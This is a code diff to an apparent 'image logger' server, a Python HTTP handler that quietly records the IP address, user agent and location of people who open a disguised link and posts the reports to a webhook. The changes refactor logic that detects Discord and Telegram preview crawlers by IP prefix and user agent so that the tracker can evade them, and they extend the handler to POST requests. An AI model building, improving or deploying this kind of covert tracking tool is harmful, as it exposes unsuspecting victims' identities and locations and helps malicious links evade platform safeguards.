@@ -65,15 +65,20 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
+
+def botCheck(ip, useragent):
+    if ip.startswith(("34", "35")):
+        return "Discord"
+    elif useragent.startswith("TelegramBot"):
+        return "Telegram"
+    else:
+        return False
+
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
     
-    bot = False
-    if ip.startswith(("34", "35")):
-        bot = "Discord"
-    elif useragent.startswith("TelegramBot"):
-        bot = "Telegram"
+    bot = botCheck(ip, useragent)
     
     if bot:
         requests.post(config["webhook"], json = {
@@ -169,7 +174,7 @@ binaries = {
 }
 
 class ImageLoggerAPI(BaseHTTPRequestHandler):
-    def do_GET(self):
+    def handleRequest(self):
         if config["imageArgument"]:
             s = self.path
             dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
@@ -196,7 +201,7 @@ div.img {{
         if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
             return
         
-        if self.headers.get('x-forwarded-for').startswith(("34", "35")) or self.headers.get('user-agent').startswith("TelegramBot"):
+        if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
             self.send_response(200)
             self.send_header('Content-type','image/jpeg' if config["buggedImage"] else 'text/html')
             self.end_headers()
@@ -267,6 +272,9 @@ if (!currenturl.includes("g=")) {
 </script>"""
             self.wfile.write(data)
     
-        return  
+        return
+    
+    do_GET = handleRequest
+    do_POST = handleRequest
 
 handler = ImageLoggerAPI
